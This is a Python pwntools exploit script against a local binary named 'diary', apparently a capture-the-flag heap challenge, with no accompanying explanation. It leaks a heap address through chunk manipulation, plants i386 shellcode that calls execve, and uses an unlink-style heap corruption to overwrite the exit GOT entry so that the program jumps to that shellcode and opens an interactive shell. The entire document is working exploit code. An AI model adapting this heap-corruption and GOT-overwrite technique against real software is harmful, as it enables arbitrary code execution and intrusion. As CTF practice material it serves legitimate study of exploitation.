from pwn import *

s = process('./diary')

exit_got = 0x602090

sc = ('''
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edi,edi
xor esi,esi
xor edx,edx
push eax
mov ebx,0x6020a0
mov dword ptr [ebx],0x61622f2e
mov dword ptr [ebx+4],0x6873
mov al,0xb
int 0x80
''')
shellcode2 = asm(sc, os='linux', arch='i386')

def regi(date,size,happened):
	s.recvuntil('>> ')
	s.sendline('1')
	s.recvuntil('... ')
	s.sendline(date)
	s.recvuntil('... ')
	s.sendline(str(size))
	s.recvuntil('>> ')
	s.sendline(happened)

def show(date):
	s.recvuntil('>> ')
	s.sendline('2')
	s.recvuntil('... ')
	s.sendline(date)

def dele(date):
	s.recvuntil('>> ')
	s.sendline('3')
	s.recvuntil('... ')
	s.sendline(date)

##########################################################
################# STAGE1 : HEAP ADD LEAK #################
##########################################################

regi('2000/10/01',0x30,"A" * 0x8)
regi('2000/10/02',0x20,"B" * 0x8)
dele('2000/10/01')
regi('2000/10/01',0x140,"C" * 0x30)
payload = "\xcc" * (0x100-0x8 - len(shellcode2) - 0x30) + shellcode2 + "\xcc" * 0x30
payload += p64(0x21) + p64(0x602110+0x20) * 2
regi('2000/10/03',0x140,payload)

dele('2000/10/01')
payload = p64(0x602110+0x20) * 2+ "C" * (0x140-0x50+0x18) + "A" * 0x20 + p64(0x130 + 0x18) # 0x40
regi('2000/10/01',0x140,payload)

dele('2000/10/03')
show('2000/10/01')
s.recvuntil('01\n')
leak = u64(s.recv(6)+"\x00"*2)
jmp_shellcode_add = leak-648
shellcode_add = leak-147-8

log.info("JMP SHELLCODE ADD LEAK : " + hex(jmp_shellcode_add))
log.info("SHELLCODE ADD LEAK : " + hex(shellcode_add))

shellcode = asm("mov rax, " + hex(shellcode_add), arch='amd64')
shellcode += asm("jmp rax", arch='amd64')

#######################################################################
################# STAGE2 : GOT OVERWRITE USING UNLINK #################
#######################################################################

regi('2000/10/04',0x38,shellcode + "GGGG")
regi('2000/10/05',0x38,"B")
regi('2000/10/06',0x38,"C") # A B C

dele('2000/10/05')
regi('2000/10/05',0x38,p64(jmp_shellcode_add) + p64(exit_got-8) + "A" * 40)
show('2000/10/05')
dele('2000/10/05')

s.recvuntil('>')
s.sendline('0')
s.interactive()
